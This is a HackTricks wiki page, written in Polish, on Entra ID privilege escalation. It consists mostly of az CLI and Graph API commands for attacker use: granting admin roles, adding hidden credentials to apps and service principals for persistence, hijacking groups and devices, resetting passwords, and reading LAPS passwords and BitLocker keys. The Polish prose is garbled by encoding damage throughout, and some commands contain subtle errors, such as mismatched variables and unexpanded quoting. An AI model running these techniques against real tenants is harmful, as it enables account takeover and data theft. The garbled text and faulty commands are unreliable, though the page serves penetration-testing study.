# Az - EntraID Privesc

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

{% hint style="info" %}
Zauwa偶, 偶e **nie wszystkie szczeg贸owe uprawnienia** wbudowanych r贸l w Entra ID **s kwalifikowane do u偶ycia w rolach niestandardowych.**
{% endhint %}

## Role

### Rola: Administrator R贸l Uprzywilejowanych <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

Ta rola zawiera niezbdne szczeg贸owe uprawnienia, aby m贸c przypisywa role do podmiot贸w i nadawa wicej uprawnie rolom. Obie te akcje mog by nadu偶ywane do eskalacji uprawnie.

* Przypisz rol u偶ytkownikowi:
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* Dodaj wicej uprawnie do roli:
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## Aplikacje

### `microsoft.directory/applications/credentials/update`

To pozwala atakujcemu na **dodanie powiadcze** (hase lub certyfikat贸w) do istniejcych aplikacji. Jeli aplikacja ma uprzywilejowane uprawnienia, atakujcy mo偶e uwierzytelni si jako ta aplikacja i uzyska te uprawnienia.
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

To pozwala na te same dziaania co `applications/credentials/update`, ale ograniczone do aplikacji w pojedynczej domenie.
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**Opis**: Aktualizuj wacicieli aplikacji\
**Potencja nadu偶ycia**: Dodajc siebie jako waciciela, atakujcy mo偶e manipulowa aplikacj, w tym danymi uwierzytelniajcymi i uprawnieniami.
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

To pozwala atakujcemu na dodanie powiadcze do istniejcych g贸wnych usug. Jeli g贸wny usug ma podwy偶szone uprawnienia, atakujcy mo偶e przyj te uprawnienia.
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
Nowo wygenerowane haso nie pojawi si w konsoli internetowej, wic mo偶e to by spos贸b na zachowanie trwaoci w usudze principal.\
Z API mo偶na je znale藕 za pomoc: `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

Jeli otrzymasz bd `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."`, to dlatego, 偶e **nie mo偶na modyfikowa waciwoci passwordCredentials** SP i najpierw musisz j odblokowa. Aby to zrobi, potrzebujesz uprawnienia (`microsoft.directory/applications/allProperties/update`), kt贸re pozwala na wykonanie:

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

To pozwala atakujcemu na dodanie powiadcze do istniejcych g贸wnych zasad usug. Jeli g贸wna zasada usug ma podwy偶szone uprawnienia, atakujcy mo偶e przyj te uprawnienia.
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

Podobnie jak w przypadku aplikacji, to uprawnienie pozwala na dodanie kolejnych wacicieli do g贸wnego obiektu usugi. Posiadanie g贸wnego obiektu usugi umo偶liwia kontrol nad jego powiadczeniami i uprawnieniami.
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
Po dodaniu nowego waciciela pr贸bowaem go usun, ale API odpowiedziao, 偶e metoda DELETE nie jest obsugiwana, nawet jeli to metoda, kt贸rej nale偶y u偶y do usunicia waciciela. Wic **nie mo偶esz usun wacicieli w dzisiejszych czasach**.
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` i `enable`

Te uprawnienia pozwalaj na wyczanie i wczanie zasad usug. Atakujcy m贸gby wykorzysta to uprawnienie, aby wczy zasad usug, do kt贸rej m贸gby uzyska dostp w jaki spos贸b, aby eskalowa uprawnienia.

Nale偶y zauwa偶y, 偶e w tej technice atakujcy bdzie potrzebowa wicej uprawnie, aby przej wczon zasad usug.
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

Te uprawnienia pozwalaj na tworzenie i uzyskiwanie powiadcze do jednolitych logowa, co mo偶e umo偶liwi dostp do aplikacji firm trzecich.

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## Grupy

### `microsoft.directory/groups/allProperties/update`

To uprawnienie pozwala na dodawanie u偶ytkownik贸w do uprzywilejowanych grup, co prowadzi do eskalacji uprawnie.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**Uwaga**: To uprawnienie wyklucza grupy przypisane do r贸l Entra ID.

### `microsoft.directory/groups/owners/update`

To uprawnienie pozwala na zostanie wacicielem grup. Waciciel grupy mo偶e kontrolowa czonkostwo i ustawienia grupy, potencjalnie eskalujc uprawnienia do grupy.
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**Uwaga**: To uprawnienie wyklucza grupy przypisane do r贸l Entra ID.

### `microsoft.directory/groups/members/update`

To uprawnienie pozwala na dodanie czonk贸w do grupy. Atakujcy m贸gby doda siebie lub zoliwe konta do uprzywilejowanych grup, co mo偶e przyzna podwy偶szone uprawnienia.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

To uprawnienie pozwala na aktualizacj reguy czonkostwa w grupie dynamicznej. Atakujcy m贸gby zmodyfikowa dynamiczne reguy, aby doda siebie do uprzywilejowanych grup bez wyra藕nego dodania.
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**Uwaga**: To uprawnienie wyklucza grupy przypisywalne do r贸l Entra ID.

### Privesc grup dynamicznych

Mo偶liwe, 偶e u偶ytkownicy mog eskalowa uprawnienia, modyfikujc swoje wasne waciwoci, aby zosta dodanymi jako czonkowie grup dynamicznych. Wicej informacji mo偶na znale藕 w:

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## U偶ytkownicy

### `microsoft.directory/users/password/update`

To uprawnienie pozwala na resetowanie hasa dla u偶ytkownik贸w niebdcych administratorami, co umo偶liwia potencjalnemu atakujcemu eskalacj uprawnie do innych u偶ytkownik贸w. To uprawnienie nie mo偶e by przypisane do niestandardowych r贸l.
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

To uprawnienie pozwala na modyfikacj waciwoci u偶ytkownika. Czsto mo偶na spotka dynamiczne grupy, kt贸re dodaj u偶ytkownik贸w na podstawie wartoci waciwoci, dlatego to uprawnienie mo偶e pozwoli u偶ytkownikowi na ustawienie wymaganej wartoci waciwoci, aby sta si czonkiem konkretnej dynamicznej grupy i eskalowa uprawnienia.

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## Polityki dostpu warunkowego i obejcie MFA

殴le skonfigurowane polityki dostpu warunkowego wymagajce MFA mog by obejcie, sprawd藕:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## Urzdzenia

### `microsoft.directory/devices/registeredOwners/update`

To uprawnienie pozwala atakujcym na przypisanie siebie jako wacicieli urzdze, aby uzyska kontrol lub dostp do ustawie i danych specyficznych dla urzdzenia.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

To uprawnienie pozwala atakujcym na powizanie swojego konta z urzdzeniami, aby uzyska dostp lub obej polityki bezpieczestwa.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

To uprawnienie pozwala atakujcym na odczytanie waciwoci zapasowych powiadcze lokalnego konta administratora dla urzdze doczonych do Microsoft Entra, w tym hasa

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

To uprawnienie pozwala na dostp do kluczy BitLocker, co mo偶e umo偶liwi atakujcemu odszyfrowanie dysk贸w, naruszajc poufno danych.

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## Inne interesujce uprawnienia (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
